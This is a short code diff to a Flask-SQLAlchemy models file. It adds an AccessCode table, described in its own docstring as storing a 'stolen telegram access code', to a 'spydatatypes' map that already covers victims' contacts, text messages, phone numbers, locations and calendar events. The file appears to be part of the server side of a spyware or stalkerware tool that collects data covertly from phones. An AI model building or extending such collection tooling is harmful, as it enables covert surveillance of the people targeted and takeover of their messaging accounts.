@@ -144,10 +144,20 @@ class CalendarEvent(db.Model):
     def __repr__(self):
         return "<CalendarEvent {}: {}>".format(self.calendar_id, self.title)
 
+class AccessCode(db.Model):
+    """Models a stolen telegram access code"""
+    __tablename__ = "access_code"
+    user_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
+    code = db.Column(db.String(16), nullable=True)
+
+    def __repr__(self):
+        return "<AccessCode for user {}: {}>".format(self.user_id, self.code)
+
 spydatatypes = {
     "contact": Contact,
     "textMessage": TextMessage,
     "phoneNumber": PhoneNumber,
     "location": Location,
     "calendar": CalendarEvent,
+    "accessCode": AccessCode,
 }
